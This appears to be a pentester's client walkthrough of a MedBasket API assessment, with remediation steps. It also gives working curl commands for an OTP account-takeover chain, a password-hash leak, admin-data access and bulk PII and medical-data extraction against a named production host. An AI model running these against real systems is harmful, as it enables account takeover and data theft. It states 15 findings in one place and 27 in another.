# MedBasket API Security Assessment — Client Walkthrough

**Prepared for:** MedBasket Engineering & Management Team
**Date:** 2026-02-18
**Classification:** Confidential
**Assessor:** [Your Name / Organization]
**Composite Risk:** 10.0 / 10.0 — CRITICAL

---

## Meeting Agenda (75-90 minutes)

| Time | Phase | Description |
|------|-------|-------------|
| 5 min | Introduction | Scope, methodology, authorization review |
| 10 min | Phase 1 | Unauthenticated data exposure — 188K users (live demo) |
| 10 min | Phase 2 | Account takeover via OTP chain (live demo) |
| 15 min | Phase 3 | Privilege escalation — regular user → admin data (live demo) |
| 5 min | Phase 4 | Additional attack surface — webhooks, S3, writes |
| 10 min | Phase 5 | Admin panel false perimeter analysis |
| 10 min | Phase 6 | Full data extraction + visual dashboard demo |
| 10 min | Remediation | Priority fixes and timeline |
| 5 min | Q&A | |

---

## Pre-Meeting Setup

### Requirements
- Terminal with `curl` and `python3`
- Browser with `poc_dashboard.html` open (pre-loaded, no internet needed)
- Screen sharing enabled
- Recording enabled (for client's records)
- Written authorization document on screen

### Files to Have Ready
```
medbasket/
  medbasket_security_assessment.md     # Full report (760 lines)
  poc/
    poc_medbasket.sh                   # Interactive PoC script (6 phases)
    walkthrough.md                     # This document
    findings_evidence.md               # Evidence package (F-01 → F-15)
    poc_dashboard.html                 # Visual dashboard (open in browser)
    build_dashboard.py                 # Fetches ALL data + generates dashboard
    fetch_orders.py                    # Standalone: all ~63K orders → JSON/CSV
    fetch_users.py                     # Standalone: all ~188K users → JSON/CSV
    fetch_medicine_requests.py         # Standalone: all ~6.6K records → JSON/CSV
    data/                              # Exported JSON + CSV files
      orders.json / orders.csv
      users.json / users.csv
      medicine_requests.json / medicine_requests.csv
      dashboard.json
```

### Pre-Meeting Preparation (15 minutes before)

**Generate fresh dashboard and data:**
```bash
cd /path/to/medbasket/poc

# Option 1: Full extraction + dashboard (takes ~30 minutes for all 188K+ records)
python3 build_dashboard.py

# Option 2: Quick — standalone scripts (can run in parallel)
python3 fetch_orders.py &
python3 fetch_users.py &
python3 fetch_medicine_requests.py &
wait

# Open dashboard in browser — no server needed
open poc_dashboard.html    # macOS
xdg-open poc_dashboard.html  # Linux
```

**Run the interactive PoC:**
```bash
chmod +x poc_medbasket.sh
./poc_medbasket.sh
```
The script is interactive — press Enter to advance between tests.

---

## Walkthrough Script

### Opening Statement

> "Thank you for joining. Today we'll walk through critical security findings
> in the MedBasket production API at api.medbasket.com. We identified
> **15 vulnerabilities** — 7 Critical, 5 High, 2 Medium, 1 Informational.
>
> What I'm about to show you represents an **active, exploitable data breach**
> affecting over 188,000 users, 63,000 customer orders, and 6,600 medical
> records. Every vulnerability was verified on your live production system.
>
> The composite CVSS risk rating is **10.0 out of 10.0**."

---

### PHASE 1: Unauthenticated Data Exposure (10 minutes)

*Findings covered: F-01, F-02, F-08, F-12*

#### Demo 1.1 — User Database [F-01] (3 minutes)

**What to show:** Open a terminal and run:
```bash
curl -s "https://api.medbasket.com/users?\$limit=1" | python3 -m json.tool | head -30
```

**Talking points:**
- "This is a simple GET request. No API key, no login, no token."
- Point out the `total` field: "**188,000+ users** are accessible this way."
- Point out `email`, `phoneNumber`, `dateOfBirth`: "Full PII on every user."
- Point out `passwordResetToken`: "This is a **live password reset token** — enough to take over this account."
- Point out `phoneOtp`: "This is the **live SMS verification code** that was just sent to their phone."
- "Any field is searchable: `?email=target@example.com` finds a specific user."
- "Pagination works: `?$limit=100&$skip=0` — an attacker pages through everything."

**Impact statement:**
> "Anyone on the internet can download your entire user database right now.
> 188,000 users' personal data — names, emails, phones, dates of birth,
> health data, and live security credentials. No authentication whatsoever."

#### Demo 1.2 — Swagger Specification [F-08] (1 minute)

**What to show:**
```bash
curl -s "https://api.medbasket.com/swagger.json" | python3 -c "
import json,sys
d = json.load(sys.stdin)
print(f'Endpoints: {len(d[\"paths\"])}')
print(f'Internal server: {d[\"servers\"][0][\"url\"]}')
"
```

**Talking points:**
- "Your complete API documentation is public — **300+ endpoints**."
- "It also leaks your internal AWS server IP address: `172.31.XX.XX`."
- "This gives any attacker a complete blueprint of your system."

#### Demo 1.3 — Password Hash Leak via PATCH [F-02] (3 minutes)

**What to show:** (Use cached output — this is a write operation)
```bash
# CAUTION: This modifies the updatedAt timestamp
curl -s -X PATCH "https://api.medbasket.com/users/<USER_ID>" \
  -H "Content-Type: application/json" -d '{}' | python3 -m json.tool | head -20
```

**Talking points:**
- "Sending an **empty PATCH** to any user returns their full Mongoose document."
- "This includes the **bcrypt password hash** — not visible on GET."
- "The FeathersJS `protect()` hooks don't run on PATCH responses."
- "Weak passwords can be cracked offline in minutes — bcrypt cost factor is only 10."
- "This also **writes to the database** — updatedAt changes — confirming unauthenticated DB writes."

**Impact statement:**
> "Every user's password hash is extractable. Users who reuse passwords
> across services are at immediate risk of credential stuffing attacks.
> This endpoint also proves unauthenticated database write access."

#### Demo 1.4 — Schema Disclosure [F-12] (1 minute)

**What to show:**
```bash
curl -s "https://api.medbasket.com/users?\$select[]=INVALID" | python3 -m json.tool
```

**Talking points:**
- "Sending an invalid field returns the **complete list of all 27 database fields**."
- "Includes undocumented fields: `googleId`, `profileToken`, `identifierType`."
- "This gives an attacker the exact schema to target."

---

### PHASE 2: Account Takeover — OTP Chain (10 minutes)

*Findings covered: F-03, F-04*

#### Demo 2.1 — The Complete Chain [F-03] (5 minutes)

**What to show:** Walk through each step:

```bash
# Step 1: Find target
curl -s "https://api.medbasket.com/users?\$limit=1&\$select[]=phoneNumber&\$select[]=email&\$select[]=_id"

# Step 2: Request OTP (no auth)
curl -s -X POST "https://api.medbasket.com/users/request-otp" \
  -H "Content-Type: application/json" \
  -d '{"phoneNumber":"+91XXXXXXXXXX"}'

# Step 3: Read OTP (no auth) — THIS IS THE CRITICAL STEP
curl -s "https://api.medbasket.com/users?phoneNumber=%2B91XXXXXXXXXX&\$select[]=phoneOtp"

# Step 4: Authenticate
curl -s -X POST "https://api.medbasket.com/authentication" \
  -H "Content-Type: application/json" \
  -d '{"strategy":"otp","phoneNumber":"+91XXXXXXXXXX","otp":"XXXXX"}'
```

**Talking points (step by step):**

1. "First, I pick any user from the database. I have their phone number."
2. "Now I request an OTP for their phone. This sends a **real SMS** to their device."
3. "Here's the critical part — I read the **OTP code directly from your API**. The same API that sent the SMS also shows the code to anyone who asks. No authentication required."
4. "Finally, I authenticate with the stolen OTP. The API gives me a **JWT token valid for 30 days**."
5. "Notice: the authentication response **also leaks the user's bcrypt password hash**."

**Pause for effect, then say:**
> "I can take over **any** account in under 3 seconds, fully automated.
> The user gets an SMS they didn't request, and by the time they see it,
> an attacker already has their session token. This works for all 188,000 users."

#### Demo 2.2 — Admin Account Takeover [F-04] (3 minutes)

**Talking points:**
- "The same chain works against admin accounts."
- "We identified `admin@[REDACTED].com` as a super-admin."
- "We executed the OTP chain against their phone number."
- "The admin's password hash was also leaked: `$2a$10$[HASH]...`"
- "Both the regular and admin JWT return **identical data** from admin endpoints — proving zero RBAC."

---

### PHASE 3: Privilege Escalation (15 minutes)

*Findings covered: F-05, F-06, F-07, F-13*

#### Demo 3.1 — Admin Dashboard [F-06] (3 minutes)

**What to show:**
```bash
TOKEN="<jwt_from_step_4>"
curl -s "https://api.medbasket.com/dashboard" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Talking points:**
- "Using the JWT from a **regular user account** — not an admin."
- "I can see your **live monthly revenue**: INR 18.6 lakh this month."
- "**Customer counts**: 16,140 this month."
- "**Recent orders** with real customer names and email addresses."
- "Weekly and daily revenue breakdowns."

#### Demo 3.2 — All Orders [F-05] (5 minutes)

**What to show:**
```bash
curl -s "https://api.medbasket.com/super-admin-users/orders?\$limit=1" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool | head -50
```

**Talking points:**
- "Despite this being under `/super-admin-users/`, **there is no role check**."
- "A regular user JWT gets the **same response** as an admin JWT — we tested both."
- Point out the `total` field: "**62,900+ orders** accessible."
- Point out the `address` object: "Full delivery address."
- Point out `coordinates`: "**GPS latitude and longitude** — you can locate where each customer lives."
- Point out `phoneNumber` and `alternatePhoneNumber`: "Two phone numbers per order."

**Impact statement:**
> "Anyone who creates an account — which takes 3 seconds and zero
> verification — can see **every order** your platform has ever processed,
> including the exact GPS location of where your customers live."

#### Demo 3.3 — Medicine Requests [F-07] (3 minutes)

**What to show:**
```bash
curl -s "https://api.medbasket.com/medicine-requests?\$limit=1" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Talking points:**
- "**6,655 medicine requests** with prescription file URLs."
- "This is **protected health information** under DPDP Act."
- "Prescription images are on S3 and **publicly accessible** via direct URL."
- "Health data has the **highest protection requirements** under Indian law."

#### JWT Issues [F-13] (2 minutes)

**Talking points:**
- "The JWT audience is `https://yourdomain.com` — the FeathersJS default."
- "Token lifetime is **30 days** — industry standard is 15-60 minutes."
- "No refresh token, no rotation, no revocation mechanism."
- "HS256 symmetric algorithm — if the secret leaks, all tokens are forgeable."

---

### PHASE 4: Additional Attack Surface (5 minutes)

*Findings covered: F-09, F-10, F-11*

Show this summary table:

| # | Finding | Evidence | Severity |
|---|---------|----------|----------|
| F-09 | Unauthenticated write operations | PATCH writes DB, POST /admin-zip-codes = 201 Created | HIGH |
| F-10 | Payment webhooks unverified | POST /webhooks = 200, PayU/Razorpay details leaked | HIGH |
| F-11 | S3 bucket misconfiguration | 98,390 files accessible, dev bucket in production | HIGH |
| — | `.env` file exists | GET /.env = 403 (not 404) | INFO |
| — | Server version disclosed | nginx/1.26.2 in headers | LOW |
| — | No security headers | Missing HSTS, CSP, X-Content-Type-Options | LOW |

**Key talking points:**
- "An attacker can **inject records** into admin tables without authentication."
- "Payment webhooks have **no signature verification** — fake payment confirmations possible."
- "98,390 uploaded files are **publicly accessible** on S3 — potentially including prescriptions."

---

### PHASE 5: Admin Panel — False Perimeter (10 minutes)

*Findings covered: F-14, F-15*

#### Demo 5.1 — Admin Panel Architecture [F-14] (5 minutes)

**What to show:**
```bash
# Admin panel uses Auth.js v5
curl -s -I "https://admin.medbasket.com/login" 2>&1 | grep -i set-cookie
# Output: __Host-authjs.csrf-token=..., __Secure-authjs.callback-url=...

# super-admin-users is a separate collection
curl -s "https://api.medbasket.com/super-admin-users" \
  -H "Authorization: Bearer $TOKEN"
# Output: 404 "No record found" (regular user ID not in admin collection)

# local strategy is disabled
curl -s -X POST "https://api.medbasket.com/authentication" \
  -H "Content-Type: application/json" \
  -d '{"strategy":"local","email":"test@test.com","password":"test"}'
# Output: "strategy not allowed in authStrategies"
```

**Talking points:**
- "The admin panel at `admin.medbasket.com` uses **Auth.js v5** — proper, modern auth."
- "The `super-admin-users` collection is **separate** from regular users."
- "The login screen is actually **well implemented**."
- "**BUT** — and this is the critical finding — **it doesn't matter**."
- "Every admin API endpoint works with a **regular user JWT**."
- "The admin panel's security is a **false perimeter** — it protects the UI, not the data."
- "An attacker simply calls the API directly and bypasses the admin panel entirely."

#### Demo 5.2 — Super-Admin Unauthenticated Endpoints [F-15] (3 minutes)

**What to show:**
```bash
# Forgot password — works without auth, confirms admin exists
curl -s -X POST "https://api.medbasket.com/super-admin-users/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@[REDACTED].com"}'
# Output: {"message":"Sent reset password mail"}
```

**Talking points:**
- "The `forgot-password` endpoint works **without authentication**."
- "It confirms whether an email belongs to a super-admin — **account enumeration**."
- "The `reset-password` endpoint is also accessible without auth (returns validation error)."
- "The `request-super-admin-otp` endpoint accepts unauthenticated requests."

---

### PHASE 6: Full Data Extraction + Visual Dashboard (10 minutes)

#### Demo 6.1 — Standalone Extraction Scripts (3 minutes)

**What to show:** Terminal with script output (pre-run or live)

**Talking points:**
- "We built standalone scripts that prove **complete database extraction** is possible."
- "Each script paginates through the API using `$limit` and `$skip` parameters."
- "There is **no rate limiting**, no anomaly detection, no pagination cap."

| Script | Records | Time | Output |
|--------|---------|------|--------|
| `fetch_orders.py` | ~63,000 orders | ~20 min | `data/orders.json` + `.csv` |
| `fetch_users.py` | ~188,000 users | ~60 min | `data/users.json` + `.csv` |
| `fetch_medicine_requests.py` | ~6,655 records | ~3 min | `data/medicine_requests.json` + `.csv` |

- "The CSV exports can be opened in Excel — making the data immediately actionable for an attacker."
- "The JSON exports contain the full nested data structure."

**Impact statement:**
> "An attacker can extract your **entire database** in under 90 minutes.
> There is nothing preventing it — no rate limits, no monitoring, no alerts.
> The data lands in clean CSV files ready for sale on the dark web."

#### Demo 6.2 — Visual Dashboard (5 minutes)

**What to show:** Open `poc_dashboard.html` in the browser

**Talking points:**
- "This dashboard was built by fetching **live data** from your production API."
- "It contains **500 real orders** with customer names, phone numbers, full addresses, and GPS coordinates."
- "Click any order row to expand — you'll see the **exact delivery location**."
- "Switch to the **Users tab** — 500 users with emails, phone numbers, dates of birth."
- "Notice the **red 'LEAKED' indicators** — those are live password reset tokens."
- "The **Medicine Requests tab** shows protected health information."
- "The totals in red show the **full scale**: 63,000+ orders, 188,000+ users, 6,655 medical records."
- "All of this was fetched using a **regular user JWT** — no admin access required."

**Impact statement:**
> "This is what an attacker's dashboard looks like. It took us 30 seconds
> to generate this from your live production data. The red numbers at the
> top are not estimates — they're the actual record counts from your database.
> This entire dataset — plus the full extraction — is achievable by anyone
> with an internet connection."

---

### Remediation Priorities (10 minutes)

Present this timeline:

```
EMERGENCY (Today — within hours)
  [ ] Take API offline or behind VPN/firewall
  [ ] Apply authenticate('jwt') hook to ALL FeathersJS services
  [ ] Fix PATCH response — serialize Mongoose docs, protect() on all methods
  [ ] Strip sensitive fields: phoneOtp, passwordResetToken, password
  [ ] Disable Swagger (/swagger.json, /docs) in production

WITHIN 48 HOURS
  [ ] Force password reset for all 188K users (all hashes compromised)
  [ ] Rotate JWT secret (invalidates all active sessions)
  [ ] Rotate AWS access keys (exposed in S3 pre-signed URLs)
  [ ] Add RBAC to: /super-admin-users/orders, /dashboard, /medicine-requests
  [ ] Block unauthenticated POST on: /admin-zip-codes, /request-otp endpoints
  [ ] Secure super-admin: forgot-password, reset-password, request-otp
  [ ] Webhook signature verification (PayU hash, Razorpay HMAC)

WITHIN 1 WEEK
  [ ] Implement rate limiting (100 req/min per IP, 5/min on auth endpoints)
  [ ] Add security headers (HSTS, CSP, X-Content-Type-Options, X-Frame-Options)
  [ ] Remove internal URLs from configs (172.31.XX.XX in Swagger)
  [ ] Migrate from dev S3 bucket (techpepo-development-s3) to production
  [ ] Reduce JWT lifetime from 30 days to 15 minutes + refresh token
  [ ] Remove server version from nginx headers (server_tokens off)

WITHIN 1 MONTH
  [ ] Full security audit of all 300+ endpoints
  [ ] Implement API gateway (centralized auth, rate limiting, WAF)
  [ ] Set up monitoring and alerting for bulk data access
  [ ] Third-party penetration test
  [ ] DPDP Act compliance review
  [ ] User notification (mandatory under DPDP Act Section 12)
  [ ] Review if breach disclosure to Data Protection Board is required
```

---

### Closing Statement

> "To summarize: your API currently has **no effective security boundary**.
>
> We demonstrated a complete chain from **zero access to full admin data
> in under 3 seconds**. We built standalone scripts that extract your
> **entire database** — 188,000 users, 63,000 orders with GPS coordinates,
> and 6,600 medical records — all to clean CSV files.
>
> Your admin panel at admin.medbasket.com has proper authentication with
> Auth.js v5 — but it's protecting only the **UI**. The underlying API
> returns the same data to any authenticated user. A regular user who
> signed up 3 seconds ago has the same data access as your super-admin.
>
> The most urgent action is to **take the API offline** until authentication
> is enforced on every endpoint. Every hour this remains live increases
> your regulatory exposure under the DPDP Act and your users' risk of
> identity theft, credential stuffing, and medical data abuse.
>
> The full technical report, including OWASP classifications, CVSS scores,
> code-level remediation guidance, and the complete evidence package with
> JWT tokens, is in the assessment deliverables. The standalone extraction
> scripts and visual dashboard demonstrate the full impact.
>
> We're available to support your engineering team through the fix process."

---

## Appendix A: Quick Reference Commands

```bash
# ─── Verification: Check if vulnerabilities are still open ───

# F-01: User endpoint still open?
curl -s -o /dev/null -w "%{http_code}" "https://api.medbasket.com/users"
# VULNERABLE: 200  |  FIXED: 401

# F-02: PATCH still leaks hashes?
curl -s -X PATCH "https://api.medbasket.com/users/<ID>" \
  -H "Content-Type: application/json" -d '{}' | grep -c "password"
# VULNERABLE: >0  |  FIXED: 0

# F-08: Swagger still exposed?
curl -s -o /dev/null -w "%{http_code}" "https://api.medbasket.com/swagger.json"
# VULNERABLE: 200  |  FIXED: 404

# F-05: Admin orders still open to regular JWT?
curl -s -o /dev/null -w "%{http_code}" "https://api.medbasket.com/super-admin-users/orders" \
  -H "Authorization: Bearer <regular_user_jwt>"
# VULNERABLE: 200  |  FIXED: 403

# F-15: Super-admin forgot-password still unauthenticated?
curl -s -o /dev/null -w "%{http_code}" -X POST \
  "https://api.medbasket.com/super-admin-users/forgot-password" \
  -H "Content-Type: application/json" -d '{"email":"test@test.com"}'
# VULNERABLE: 200  |  FIXED: 401

# ─── Data Extraction (run before meeting) ───

python3 poc/fetch_orders.py              # All orders → data/orders.json + .csv
python3 poc/fetch_users.py               # All users → data/users.json + .csv
python3 poc/fetch_medicine_requests.py   # All med requests → data/*.json + .csv
python3 poc/build_dashboard.py           # All of the above + HTML dashboard
```

## Appendix B: Post-Fix Verification Matrix

| # | Fix | Verification | Expected |
|---|-----|-------------|----------|
| F-01 | Auth on /users | `GET /users` without token | 401 |
| F-02 | PATCH sanitized | `PATCH /users/{id}` with token | No `_doc`, no `password` |
| F-02 | Auth on PATCH | `PATCH /users/{id}` without token | 401 |
| F-03 | OTP not readable | `GET /users?$select[]=phoneOtp` | Field absent or null |
| F-05 | RBAC on orders | `GET /super-admin-users/orders` with regular JWT | 403 |
| F-06 | RBAC on dashboard | `GET /dashboard` with regular JWT | 403 |
| F-07 | Auth on medicine | `GET /medicine-requests` with regular JWT | 403 |
| F-08 | Swagger disabled | `GET /swagger.json` | 404 |
| F-09 | Auth on writes | `POST /admin-zip-codes` without token | 401 |
| F-10 | Webhook signatures | `POST /webhooks` without valid signature | 401 |
| F-11 | S3 access | Direct S3 object URL | 403 |
| F-13 | JWT lifetime | Decode new JWT, check `exp - iat` | ≤ 3600 seconds |
| F-13 | JWT audience | Decode new JWT, check `aud` | Not `yourdomain.com` |
| F-15 | Super-admin forgot | `POST /super-admin-users/forgot-password` without auth | 401 |
| — | Rate limiting | 100+ requests in 1 minute | 429 after threshold |
| — | Security headers | Check response headers | HSTS, CSP, X-Content-Type-Options |
| — | Password not in auth | `POST /authentication` (successful) | No `password` field |

## Appendix C: Deliverable Package

```
medbasket/
│
├── medbasket_security_assessment.md      # Full technical report
│     Sections 1-15: findings, OWASP, CVSS, regulatory, remediation
│     760 lines, 27 findings, composite CVSS 10.0
│
└── poc/
    ├── poc_medbasket.sh                  # Interactive PoC (6 phases, press Enter)
    ├── walkthrough.md                    # Client presentation guide (this file)
    ├── findings_evidence.md              # Raw evidence package (F-01 → F-15)
    │     JWT tokens, API responses, access matrices, verification procedures
    │
    ├── build_dashboard.py                # Fetches ALL data + generates dashboard
    ├── fetch_orders.py                   # Standalone: all ~63K orders → JSON/CSV
    ├── fetch_users.py                    # Standalone: all ~188K users → JSON/CSV
    ├── fetch_medicine_requests.py        # Standalone: all ~6.6K records → JSON/CSV
    │
    ├── poc_dashboard.html                # Visual dashboard (open in browser)
    │     500 orders, 500 users, 200 med requests with embedded PII
    │     Revenue charts, expandable details, tabbed interface
    │
    └── data/                             # Exported datasets (generated by scripts)
        ├── orders.json / orders.csv      # Full order data with addresses + GPS
        ├── users.json / users.csv        # Full user data with PII + credentials
        ├── medicine_requests.json / .csv # Full medical data with prescription URLs
        └── dashboard.json                # Business intelligence snapshot
```

## Appendix D: Finding Cross-Reference

| ID | Title | CVSS | OWASP | Phase |
|----|-------|------|-------|-------|
| F-01 | Unauthenticated User Database Access | 9.8 | API1 + API2 | 1 |
| F-02 | Password Hash Exposure via PATCH | 9.8 | API3 | 1 |
| F-03 | Account Takeover — Regular User (OTP) | 10.0 | API2 | 2 |
| F-04 | Account Takeover — Admin User (OTP) | 10.0 | API2 | 2 |
| F-05 | Broken Function-Level Auth (Orders) | 9.8 | API5 | 3 |
| F-06 | Admin Dashboard Without RBAC | 9.8 | API5 | 3 |
| F-07 | Medical Data Exposure | 7.5 | API1 | 3 |
| F-08 | Swagger/OpenAPI Exposure | 7.5 | API8 | 1 |
| F-09 | Unauthenticated Write Operations | 8.6 | API2 | 4 |
| F-10 | Payment Webhook Abuse | 8.1 | API8 | 4 |
| F-11 | S3 Bucket Misconfiguration | 7.5 | API8 | 4 |
| F-12 | Schema Disclosure via Validation | 5.3 | API3 | 1 |
| F-13 | JWT Configuration Weaknesses | 7.1 | API2 | 3 |
| F-14 | Admin Panel False Security Perimeter | 9.8 | API5 | 5 |
| F-15 | Super-Admin Unauthenticated Endpoints | 5.3 | API2 | 5 |

---

*End of walkthrough document.*
